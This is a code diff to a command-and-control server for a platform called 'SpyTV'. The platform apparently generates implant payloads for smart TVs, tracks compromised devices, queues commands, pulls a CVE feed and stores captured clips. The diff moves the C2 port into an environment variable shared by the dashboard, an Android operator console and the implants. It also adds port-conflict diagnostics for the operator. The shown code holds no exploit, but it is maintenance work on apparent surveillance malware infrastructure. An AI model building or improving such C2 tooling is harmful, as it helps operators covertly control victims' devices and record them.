@@ -57,7 +57,11 @@ FAMILY_TO_TV_TYPE = {
 
 # Configuration
 C2_HOST = "0.0.0.0"
-C2_PORT = 8443
+# One source of truth for the port: the dashboard, the Android console and every
+# generated implant payload are built from this value, so an operator whose 8443
+# is already taken can move the whole platform with SPYTV_C2_PORT=9443 instead
+# of editing code (the Android console takes the same URL from its settings).
+C2_PORT = int(os.environ.get("SPYTV_C2_PORT") or 8443)
 STORE_DIR = os.path.join("c2_data", "clips")
 DEVICE_FILE = os.path.join("c2_data", "devices.json")
 COMMAND_FILE = os.path.join("c2_data", "commands.json")
@@ -1418,11 +1422,33 @@ def main():
     print("Starting CVE feed update in background...")
     threading.Thread(target=_startup_cve_update, daemon=True).start()
 
-    server = HTTPServer((C2_HOST, C2_PORT), C2Handler)
+    try:
+        server = HTTPServer((C2_HOST, C2_PORT), C2Handler)
+    except OSError as e:
+        # A port that is already taken is the classic "the dashboard/Android
+        # console shows something that isn't SpyTV" failure: the console and the
+        # implants still point at this port, so they happily talk to whatever
+        # else owns it. Fail loudly with a diagnosis instead of a bare traceback.
+        errno_ = getattr(e, "errno", None)
+        in_use = errno_ in (48, 98, 10048) or "in use" in str(e).lower()
+        print(f"[FATAL] cannot bind {C2_HOST}:{C2_PORT} — {e}")
+        if in_use:
+            print(f"        Port {C2_PORT} is already owned by another program on this")
+            print("        machine, so clients pointed here would reach THAT program")
+            print("        (the Android console included). Find the owner:")
+            print(f'          netstat -ano | findstr :{C2_PORT}      # Windows')
+            print(f"          lsof -nP -iTCP:{C2_PORT} -sTCP:LISTEN   # macOS/Linux")
+            print("        Stop it, or restart the C2 on another port and point the")
+            print("        Android console at that URL (settings button in the app):")
+            print(f"          SPYTV_C2_PORT={C2_PORT + 1} python c2_server.py")
+        raise SystemExit(1)
+
     local_ip = get_local_ip()
     print(f"C2 Server running on http://{C2_HOST}:{C2_PORT}")
     print(f"Local IP: {local_ip}")
     print(f"Dashboard: http://{local_ip}:{C2_PORT}/")
+    print("Android console: enter the URL above in the app's settings (⚙) — "
+          "'localhost' on a phone is the phone, not this machine.")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
